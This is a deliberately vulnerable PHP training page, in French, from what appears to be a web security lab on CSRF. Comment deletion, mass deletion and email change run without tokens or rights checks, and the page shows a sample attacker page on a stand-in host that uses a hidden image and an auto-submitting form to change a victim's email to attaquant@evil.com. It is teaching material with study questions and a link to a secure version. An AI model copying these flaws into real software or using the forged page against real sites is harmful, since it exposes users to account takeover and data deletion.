<?php
/**
 * PARTIE F - CSRF VULNERABLE
 * 
 * [ATTENTION] CE CODE EST VOLONTAIREMENT VULNERABLE - NE PAS UTILISER EN PRODUCTION
 * 
 * Failles presentes :
 * - Pas de token CSRF
 * - Action sensible executable via GET
 * - Pas de verification de l'origine de la requete
 */

require_once __DIR__ . '/../init.php';
require_once __DIR__ . '/../functions.php';
include __DIR__ . '/../templates/header.php';

$message = '';

// [VULNERABLE] VULNERABLE : Suppression via GET sans token CSRF
if (isset($_GET['del_id'])) {
    $id = $_GET['del_id'];
    
    // [VULNERABLE] VULNERABLE : Pas de verification CSRF
    // [VULNERABLE] VULNERABLE : Pas de verification des droits
    $stmt = $pdo->prepare("DELETE FROM commentaires WHERE id = ?");
    $stmt->execute([$id]);
    
    $message = '<div class="alert alert-success">Commentaire #' . htmlspecialchars($id) . ' supprime !</div>';
}

// [VULNERABLE] VULNERABLE : Action sensible via POST sans token CSRF
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    if ($_POST['action'] === 'delete_all') {
        // [VULNERABLE] VULNERABLE : Suppression de masse sans confirmation ni token
        $pdo->exec("DELETE FROM commentaires");
        $message = '<div class="alert alert-warning">Tous les commentaires ont t supprimes !</div>';
    }
    
    if ($_POST['action'] === 'change_email' && isset($_POST['new_email'])) {
        // [VULNERABLE] VULNERABLE : Changement d'email sans token CSRF
        $user_id = $_SESSION['user_id'] ?? 1;
        $new_email = $_POST['new_email'];
        $stmt = $pdo->prepare("UPDATE membres SET email = ? WHERE id = ?");
        $stmt->execute([$new_email, $user_id]);
        $message = '<div class="alert alert-success">Email modifie en : ' . htmlspecialchars($new_email) . '</div>';
    }
}

// Recuperation des commentaires
$stmt = $pdo->query("SELECT * FROM commentaires ORDER BY id DESC LIMIT 10");
$commentaires = $stmt->fetchAll();
?>

<h2> Partie F - Faille CSRF</h2>

<div class="danger-box">
    <strong>[VULN] VERSION VULNERABLE</strong><br>
    Aucun token CSRF. Un attaquant peut forger des requetes au nom de l'utilisateur.
</div>

<?= $message ?>

<h3>Commentaires (avec suppression vulnerable)</h3>
<?php if (empty($commentaires)): ?>
    <p>Aucun commentaire.</p>
<?php else: ?>
    <table>
        <thead>
            <tr><th>ID</th><th>Auteur</th><th>Contenu</th><th>Action</th></tr>
        </thead>
        <tbody>
        <?php foreach ($commentaires as $c): ?>
            <tr>
                <td><?= $c['id'] ?></td>
                <td><?= htmlspecialchars($c['auteur']) ?></td>
                <td><?= htmlspecialchars(substr($c['contenu'], 0, 50)) ?>...</td>
                <!-- [VULNERABLE] VULNERABLE : Suppression via GET -->
                <td><a href="?del_id=<?= $c['id'] ?>" onclick="return confirm('Supprimer ?')"> Supprimer</a></td>
            </tr>
        <?php endforeach; ?>
        </tbody>
    </table>
<?php endif; ?>

<h3>Actions administrateur</h3>

<!-- [VULNERABLE] VULNERABLE : Formulaires sans token CSRF -->
<form method="POST" style="display:inline;">
    <input type="hidden" name="action" value="delete_all">
    <button type="submit" style="background: #dc3545;" onclick="return confirm('Supprimer TOUS les commentaires ?')">
         Supprimer tous les commentaires
    </button>
</form>

<form method="POST" style="margin-top: 20px;">
    <input type="hidden" name="action" value="change_email">
    <label for="new_email">Changer mon email :</label>
    <input type="email" name="new_email" id="new_email" placeholder="nouvel@email.com">
    <button type="submit"> Modifier</button>
</form>

<h3> Exploitation CSRF</h3>
<p>Un attaquant peut creer une page malveillante qui execute des actions au nom de la victime :</p>

<div class="code-block">
&lt;!-- Page de l'attaquant : http://attaquant.com/piege.html --&gt;
&lt;html&gt;
&lt;body&gt;
    &lt;h1&gt;Vous avez gagn un iPhone !&lt;/h1&gt;
    
    &lt;!-- Suppression via image (GET) --&gt;
    &lt;img src="http://victime.com/vuln/del_vuln.php?del_id=1" style="display:none"&gt;
    
    &lt;!-- Changement d'email via formulaire cach (POST) --&gt;
    &lt;form id="csrf" action="http://victime.com/vuln/del_vuln.php" method="POST"&gt;
        &lt;input type="hidden" name="action" value="change_email"&gt;
        &lt;input type="hidden" name="new_email" value="attaquant@evil.com"&gt;
    &lt;/form&gt;
    &lt;script&gt;document.getElementById('csrf').submit();&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</div>

<h3> Questions</h3>
<ol>
    <li>Qu'est-ce qu'une attaque CSRF ?</li>
    <li>Pourquoi la suppression via GET est-elle particulirement dangereuse ?</li>
    <li>Comement fonctionne un token CSRF ?</li>
    <li>Quel rle joue l'attribut SameSite des cookies ?</li>
</ol>

<p><a href="../secure/del_secure.php"> Voir la version securisee</a></p>

    </main>\r\n</div>\r\n</body>\r\n</html>
